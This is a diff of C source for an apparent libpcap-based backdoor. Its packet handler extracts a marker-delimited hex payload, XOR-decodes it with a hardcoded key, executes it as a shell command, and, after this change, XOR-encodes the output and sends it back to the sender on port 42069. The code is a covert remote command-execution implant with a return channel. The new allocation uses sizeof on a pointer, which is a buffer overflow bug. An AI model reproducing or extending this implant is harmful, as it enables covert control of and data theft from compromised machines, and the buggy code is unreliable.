@@ -56,17 +56,20 @@ void execute_command(const char *command, char **result)
 */
 void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
 {
-    char *command_output;
 
     const char* COMMAND_START = "start[";
     const char* COMMAND_END = "]end";
     const char* KEY = "key";
 
+    const int SERVER_PORT = 42069;
     const int MAX_COMMAND_LEN = 1024;
 
     char command[MAX_COMMAND_LEN];
     char payload_buffer[MAX_COMMAND_LEN];
     char decrypted[MAX_COMMAND_LEN];
+
+    char *command_output;
+    char *encrypted_command_output;
 
     int tcp_sport;
     unsigned int tcp_seqnum;
@@ -104,7 +107,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
     // Step 3: Decrypt the payload
     hex_str_to_bytes(payload, payload_buffer, strlen(payload));
-    xor_decrypt(KEY, strlen(KEY), payload_buffer, strlen(payload) / 2, decrypted);
+    xor_string(KEY, strlen(KEY), payload_buffer, decrypted, strlen(payload) / 2);
     printf("Decrypted payload: %s\n", decrypted);
 
     // Step 4: Verify decrypted payload has a command in it
@@ -119,8 +122,11 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     execute_command(command, &command_output);
 
     // Step 7: Send the results back
-    // printf("%s", command_output); // replace this with sending the command results back
-    send_message_to_ip(ip->ip_src, 42069, command_output, strlen(command_output));
+    encrypted_command_output = (char*)malloc(sizeof(command_output));
+    xor_string(KEY, strlen(KEY), command_output, encrypted_command_output, strlen(command_output));
+    send_message_to_ip(ip->ip_src, SERVER_PORT, encrypted_command_output, strlen(encrypted_command_output));
+
+    free(encrypted_command_output);
     free(command_output); // free command_output which was malloced by execute_command
 
     return;
